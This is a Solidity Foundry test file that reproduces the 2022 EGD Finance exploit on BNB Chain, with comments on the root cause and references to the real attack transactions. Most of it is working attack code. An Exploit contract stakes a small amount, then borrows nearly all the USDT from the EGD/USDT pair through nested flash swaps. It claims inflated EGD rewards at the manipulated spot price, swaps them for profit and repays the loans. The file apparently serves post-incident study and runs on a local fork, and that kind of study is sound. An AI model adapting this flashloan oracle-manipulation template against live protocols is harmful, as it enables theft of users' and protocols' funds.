// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// VULNERABILITY: Flashloan-enabled spot price manipulation on reward claim (EGD Finance)
// 
// Root Cause:
//   - getEGDPrice() (Logic:0x93c175... L111) reads live token balances from the EGD/USDT Pancake pair:
//       return (U.balanceOf(pair) * 1e18 / EGD.balanceOf(pair));
//   - claimAllReward() (L240) converts accrued "quota" (USDT-time product) into EGD payout:
//       rew += quota * 1e18 / getEGDPrice();
//       EGD.transfer(msg.sender, rew);
//   - NO TWAP, no Chainlink, no min/max sanity, no flashloan guard, no reentrancy guard around price use.
//   - The pair used for price is the same permissionless AMM pair; any caller can imbalance it atomically via flash swap.
// 
// Why it works:
//   - UniswapV2-style pair.swap(0, borrowUSDT, attacker, data) transfers USDT out, then synchronously invokes pancakeCall.
//   - Inside pancakeCall (before repaying), pair's actual USDT.balanceOf is reduced while EGD.balanceOf is unchanged.
//   - getEGDPrice() therefore returns a drastically LOWER price.
//   - Low price => division yields massively inflated EGD reward for the pre-staked quota.
//   - Attacker swaps extracted EGD back to USDT on router (now with restored pool or arbitrage), repays flashloans + fees, keeps profit.
//   - All in one tx; no net capital at risk beyond tx fees/gas.
// 
// Exploit preconditions (all satisfied here):
//   1. Small legitimate stake exists to create non-zero userSlot + quota (leftQuota/rates).
//   2. Time has passed (warp) so calculateReward produces positive quota.
//   3. Flashloan liquidity available on both the target pair and a helper pair (for initial USDT capital).
//   4. claimAllReward has no access control beyond "has stake" + not blacklisted.
// 
// Impact:
//   - Direct theft of EGD tokens from the contract's EGD balance (protocol treasury / emissions).
//   - Realized loss reported ~$36k (attacker profit).
//   - Price oracle corruption affects only the reward calc path in this tx; but since EGD is transferred out, permanent dilution/loss.
//   - Any staker with accrued reward could in principle be front-run or the attacker can self-stake tiny amounts.
// 
// Material Harm: Attacker drains protocol EGD (valued in USDT) by abusing the price-dependent conversion inside claim; stakers' backing and protocol solvency impaired.
// 
// References in code: see marked sections in EGD_Finance logic (getEGDPrice + claimAllReward) and exploit flow below.

IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", 20_245_522);

        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(EGD_Finance, "EGD_Finance");
        vm.label(usdt, "USDT");
        vm.label(egd, "EGD");
    }

    function testExploit() public {
        Exploit exploit = new Exploit();

        console.log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------");
        console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
        console.log("Attacker Stake 100 USDT to EGD Finance");

        exploit.stake();
        vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)
        // Warp creates positive accrued quota = (ts - claimTime) * rates , capped by leftQuota.
        // calculateAll returns the USDT-value quota; price inversion only at claim time.

        console.log("-------------------------------- Start Exploit ----------------------------------");
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
        );
        emit log_named_decimal_uint(
            "[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18
        );
        console.log("Attacker manipulating price oracle of EGD Finance...");

        exploit.harvest();

        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}

/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test {
    uint256 borrow1;
    uint256 borrow2;

    function stake() public {
        // Pre-work (from real attacker's prior tx): create a stake position so that:
        // - userInfo has invitor
        // - userSlot has rates, leftQuota >0 , claimTime set
        // - calculateAll() will return positive value after time warp
        // - claimAllReward() will be allowed (requires userStakeList.length > 0)
        // Small 100 USDT stake is enough; the flash manip multiplies the EGD payout arbitrarily.
        // Give exploit contract 100 USDT
        deal(address(usdt), address(this), 100 ether);
        // Set invitor
        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        // Stake 100 USDT
        IERC20(usdt).approve(EGD_Finance, 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function harvest() public {
        // EXPLOIT STEPS:
        // 1. Flashloan[1]: borrow 2000 USDT from unrelated USDT/WBNB pool (provides capital to repay flash2 + fees).
        // 2. In pancakeCall("0000"): compute borrow2 = ~99.99999925% of USDT in EGD/USDT target pair.
        // 3. Flashloan[2]: EGD_USDT_LPPool.swap(0, borrow2, this, "00") -- this sends USDT out of the oracle pair.
        // 4. In inner pancakeCall (else branch): 
        //      - Observe manipulated (very low) price via getEGDPrice()
        //      - Call claimAllReward() --> inflates EGD reward payout because of /lowPrice
        //      - Repay flash2 with USDT+fee (same token, satisfies v2 K invariant)
        // 5. Back in outer callback:
        //      - Swap all received EGD -> USDT via router (profit realization)
        //      - Repay flash1 with 2010 USDT (covers 0.25% fee)
        // 6. Surplus USDT remains as attacker profit; EGD drained from protocol.
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
            console.log("Flashloan[2] payback success");

            // Swap all egd -> usdt
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 1e18); // Pancakeswap fee is 0.25%, so attacker needs to pay back usdt >2000/0.9975 (Cannot be exactly 0.25%)
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint(
                "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
            );
            // -----------------------------------------------------------------
            // Critical step: claim happens while pair USDT balance is still reduced (before repay)
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = (amount1 * 10_000 / 9970) - amount1; // Attacker needs to pay >0.25% fee back to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);
            require(suc, "Flashloan[2] payback failed");
        }
    }
}
/* -------------------- Interface -------------------- */

// NOTE: These are the only methods used by the attacker. The real contract has many more (see sources/ version).
// The vuln is NOT in the interface but in the implementation of getEGDPrice + claimAllReward that it calls.

interface IEGD_Finance {
    function bond(
        address invitor
    ) external;
    function stake(
        uint256 amount
    ) external;
    function calculateAll(
        address addr
    ) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}
